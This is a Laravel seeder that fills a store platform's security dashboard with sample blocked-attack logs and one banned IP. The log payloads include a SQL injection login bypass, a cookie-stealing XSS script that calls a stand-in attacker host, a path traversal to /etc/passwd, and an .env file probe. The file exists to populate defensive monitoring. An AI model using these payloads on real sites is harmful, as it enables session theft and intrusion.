<?php

namespace Database\Seeders;

use App\Models\BlockedIp;
use App\Models\SecurityLog;
use Illuminate\Database\Seeder;
use Illuminate\Support\Carbon;

class SecurityIncidentSampleSeeder extends Seeder
{
    public function run(): void
    {
        $now = Carbon::now();

        $samples = [
            [
                'incident_id' => 'SEC-98A41C02',
                'tenant_id' => 'RechnaDB',
                'store_name' => 'Meas Rechna',
                'ip_address' => '103.216.48.15',
                'country_code' => 'KH',
                'country_name' => 'Cambodia',
                'city' => 'Phnom Penh',
                'latitude' => 11.5564000,
                'longitude' => 104.9282000,
                'is_vpn' => false,
                'isp' => 'EZECOM Cambodia ISP',
                'threat_type' => 'sql_injection',
                'severity' => 'critical',
                'request_method' => 'POST',
                'request_url' => 'http://rechna.localhost/api/v1/user/login',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'payload' => "username=' OR '1'='1' -- /* bypass auth */",
                'action_taken' => 'blocked',
                'created_at' => $now->copy()->subMinutes(12),
                'updated_at' => $now->copy()->subMinutes(12),
            ],
            [
                'incident_id' => 'SEC-5B190F84',
                'tenant_id' => 'b001',
                'store_name' => 'bo001',
                'ip_address' => '185.220.101.5',
                'country_code' => 'DE',
                'country_name' => 'Germany',
                'city' => 'Frankfurt',
                'latitude' => 50.1109000,
                'longitude' => 8.6821000,
                'is_vpn' => true,
                'isp' => 'Tor Exit Node / Datacenter Network',
                'threat_type' => 'vpn_proxy_blocked',
                'severity' => 'medium',
                'request_method' => 'POST',
                'request_url' => 'http://b001.localhost/api/v1/orders/checkout',
                'user_agent' => 'Mozilla/5.0 (Tor Browser 13.0.9)',
                'payload' => 'Commercial VPN / Anonymous Proxy access blocked under security policy',
                'action_taken' => 'blocked',
                'created_at' => $now->copy()->subMinutes(28),
                'updated_at' => $now->copy()->subMinutes(28),
            ],
            [
                'incident_id' => 'SEC-7E3D4A91',
                'tenant_id' => null,
                'store_name' => 'Central (All Stores)',
                'ip_address' => '45.155.205.233',
                'country_code' => 'RU',
                'country_name' => 'Russia',
                'city' => 'Moscow',
                'latitude' => 55.7558000,
                'longitude' => 37.6173000,
                'is_vpn' => true,
                'isp' => 'HostRoyale AS / Scanner Botnet',
                'threat_type' => 'honeypot_trap',
                'severity' => 'critical',
                'request_method' => 'GET',
                'request_url' => 'http://localhost:8880/.env',
                'user_agent' => 'Go-http-client/1.1 (Automated Environment Harvester)',
                'payload' => 'Honeypot hit on protected environment file: /.env',
                'action_taken' => 'blocked_and_banned',
                'created_at' => $now->copy()->subMinutes(45),
                'updated_at' => $now->copy()->subMinutes(45),
            ],
            [
                'incident_id' => 'SEC-2F88D0C3',
                'tenant_id' => 'RechnaDB',
                'store_name' => 'Meas Rechna',
                'ip_address' => '1.47.168.99',
                'country_code' => 'TH',
                'country_name' => 'Thailand',
                'city' => 'Bangkok',
                'latitude' => 13.7563000,
                'longitude' => 100.5018000,
                'is_vpn' => false,
                'isp' => 'True Internet Broadband',
                'threat_type' => 'cross_site_scripting',
                'severity' => 'high',
                'request_method' => 'POST',
                'request_url' => 'http://rechna.localhost/api/v1/customer/feedback',
                'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                'payload' => '<script>fetch("https://attacker.evil/steal?cookie="+document.cookie)</script>',
                'action_taken' => 'blocked',
                'created_at' => $now->copy()->subHours(2),
                'updated_at' => $now->copy()->subHours(2),
            ],
            [
                'incident_id' => 'SEC-4A77189E',
                'tenant_id' => 'b001',
                'store_name' => 'bo001',
                'ip_address' => '194.26.29.112',
                'country_code' => 'FR',
                'country_name' => 'France',
                'city' => 'Paris',
                'latitude' => 48.8566000,
                'longitude' => 2.3522000,
                'is_vpn' => true,
                'isp' => 'OVH SAS Datacenter Proxy',
                'threat_type' => 'path_traversal',
                'severity' => 'high',
                'request_method' => 'GET',
                'request_url' => 'http://b001.localhost/v1/api/file?path=../../../../etc/passwd',
                'user_agent' => 'sqlmap/1.7.2#stable',
                'payload' => 'Path traversal pattern ../../../../etc/passwd detected',
                'action_taken' => 'blocked',
                'created_at' => $now->copy()->subHours(4),
                'updated_at' => $now->copy()->subHours(4),
            ],
            [
                'incident_id' => 'SEC-6D9933B7',
                'tenant_id' => null,
                'store_name' => 'Central (All Stores)',
                'ip_address' => '198.51.100.77',
                'country_code' => 'US',
                'country_name' => 'United States',
                'city' => 'Los Angeles',
                'latitude' => 34.0522000,
                'longitude' => -118.2437000,
                'is_vpn' => false,
                'isp' => 'Cloudflare Anycast Net',
                'threat_type' => 'brute_force_login',
                'severity' => 'medium',
                'request_method' => 'POST',
                'request_url' => 'http://localhost:8880/admin/login',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'payload' => 'Exceeded maximum login attempts: 5 consecutive failures',
                'action_taken' => 'blocked',
                'created_at' => $now->copy()->subHours(6),
                'updated_at' => $now->copy()->subHours(6),
            ],
        ];

        foreach ($samples as $sample) {
            SecurityLog::query()->updateOrCreate(
                ['incident_id' => $sample['incident_id']],
                $sample
            );
        }

        // Seed 1 active block to populate Blocked IPs tab as well
        BlockedIp::query()->updateOrCreate(
            ['ip_address' => '45.155.205.233'],
            [
                'ip_address' => '45.155.205.233',
                'reason' => 'Automated honeypot trigger on protected environment file: /.env',
                'threat_type' => 'honeypot_trap',
                'strike_count' => 3,
                'blocked_by' => 'WAF Auto-Ban',
                'expires_at' => Carbon::now()->addDays(7),
            ]
        );
    }
}
